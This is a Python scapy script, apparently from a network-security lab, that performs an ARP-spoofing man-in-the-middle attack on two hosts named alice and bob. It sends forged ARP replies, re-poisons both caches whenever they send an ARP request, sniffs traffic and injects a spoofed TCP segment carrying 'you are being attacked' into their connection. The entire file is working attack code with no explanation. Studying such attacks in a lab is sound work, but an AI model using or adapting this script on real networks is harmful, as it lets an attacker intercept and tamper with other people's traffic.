import scapy.all as scapy
import time

alice_ip = '10.2.2.2'
alice_mac = '02:42:0a:02:02:02'
bob_ip = '10.2.2.3'
bob_mac = '02:42:0a:02:02:03'
me_ip = '10.2.2.5'
me_mac = '02:42:0a:02:02:05'

done = False
packet = scapy.ARP(op=2, pdst=alice_ip, hwdst=alice_mac, psrc=bob_ip)
packet2 = scapy.ARP(op=2, pdst=bob_ip, hwdst=bob_mac, psrc=alice_ip)
scapy.send(packet)
scapy.send(packet2)
while not done:
    pkts = scapy.sniff(count=1)
    p = pkts[0]
    if p.haslayer(scapy.ARP):
        if p.pdst == bob_ip and p.psrc == alice_ip:
            print('Found ARP Req for 10.2.2.3')
            time.sleep(0.3)
            packet = scapy.ARP(op=2, pdst=alice_ip, hwdst=alice_mac, psrc=bob_ip)
            scapy.send(packet)
        elif p.pdst == alice_ip and p.psrc == bob_ip:
            print('Found ARP Req for 10.2.2.2')
            time.sleep(0.3)
            packet = scapy.ARP(op=2, pdst=bob_ip, hwdst=bob_mac, psrc=alice_ip)
            scapy.send(packet)
    elif p.haslayer(scapy.TCP):
        p_ip = p[1]
        if p.haslayer(scapy.Raw):
            p_tcp = p[scapy.TCP]
            print(p_tcp.show())
            IPL = scapy.IP(src=alice_ip, dst=bob_ip)
            TCPL = scapy.TCP(sport=p_tcp.sport, dport=p_tcp.dport, flags='A', seq=p_tcp.seq, ack=p_tcp.ack)
            Data = "you are being attacked\n"
            pkt = IPL / TCPL / Data
            scapy.send(pkt)
        else:
            p_tcp = p[scapy.TCP]
            if p_ip.dst == bob_ip and p_ip.src == alice_ip:
                IPL = scapy.IP(src=alice_ip, dst=bob_ip)
                TCPL = scapy.TCP(sport=p_tcp.sport, dport=p_tcp.dport, flags='A', seq=p_tcp.seq, ack=p_tcp.ack)
                pkt = IPL / TCPL
                print("coming from alice to bob")
            elif p_ip.dst == alice_ip and p_ip.src == bob_ip:
                IPL = scapy.IP(src=bob_ip, dst=alice_ip)
                TCPL = scapy.TCP(sport=p_tcp.sport, dport=p_tcp.dport, flags='A', seq=p_tcp.seq, ack=p_tcp.ack)
                pkt = IPL / TCPL
                print("coming from bob to alice")
